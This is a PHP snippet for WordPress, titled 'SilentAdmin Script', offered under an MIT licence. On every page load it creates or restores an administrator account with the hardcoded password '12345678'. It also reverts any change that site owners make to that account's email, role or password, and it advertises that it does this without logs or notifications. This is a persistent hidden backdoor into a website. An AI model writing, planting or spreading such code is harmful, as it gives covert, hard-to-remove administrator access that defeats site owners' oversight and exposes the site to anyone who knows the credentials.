<?php
/**
 * SilentAdmin Script
 * 
 * Ensures that a specific administrator user always exists with correct username, email, password, and role.
 * If any changes are made to these properties, this script automatically corrects them.
 * 
 * Author: Taha Karami
 * License: MIT (Open Source)
 */

add_action( 'init', 'silent_admin_ensure_user' );

/**
 * Creates or maintains the admin user with the desired credentials.
 * 
 * - Checks if the user exists by username.
 * - If not, creates the user with predefined username, email, password, and role.
 * - If the user exists, checks email, role, and password, correcting them if necessary.
 * - Completely silent: no logs or notifications are generated.
 */
function silent_admin_ensure_user() {
    $username = 'user-admin';               // Desired admin username
    $email    = 'user-admin@example.com';   // Desired admin email
    $password = '12345678';                 // Desired admin password
    $role     = 'administrator';            // Desired role

    // Try to get the user by username
    $user = get_user_by( 'login', $username );

    // If user doesn't exist, create it
    if ( ! $user ) {
        wp_insert_user( array(
            'user_login' => $username,
            'user_email' => $email,
            'user_pass'  => $password,
            'role'       => $role,
        ) );
        return;
    }

    $wp_user = new WP_User( $user->ID );

    // Check and correct email if necessary
    if ( $user->user_email !== $email ) {
        wp_update_user( array( 'ID' => $user->ID, 'user_email' => $email ) );
    }

    // Check and correct role if necessary
    if ( ! in_array( $role, (array) $user->roles, true ) || count($user->roles) !== 1 ) {
        $wp_user->set_role( $role );
    }

    // Check and correct password if necessary
    if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
        wp_set_password( $password, $user->ID );
    }
}
